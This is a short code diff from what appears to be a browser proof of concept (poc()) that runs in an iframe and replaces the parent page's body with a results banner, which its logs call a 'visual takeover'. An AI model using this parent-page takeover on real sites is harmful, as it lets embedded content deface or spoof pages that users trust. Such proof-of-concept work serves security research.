@@ -219,10 +219,9 @@ async function poc() {
       '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;max-width:650px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both">' + resultsGrid + '</div>'
     );
 
-    const parentDoc = window.parent.document;
-    parentDoc.open();
-    parentDoc.write('<!DOCTYPE html><html><head><meta charset="utf-8"></head><body style="margin:0">' + finalHTML + '</body></html>');
-    parentDoc.close();
+    // Use innerHTML instead of document.write to avoid killing our iframe
+    window.parent.document.body.style.cssText = 'margin:0;overflow:hidden';
+    window.parent.document.body.innerHTML = finalHTML;
     console.log("[FINAL] Parent DOM replaced with results banner");
   } catch(e) {
     console.log("[FINAL] Visual takeover failed:", e.message);
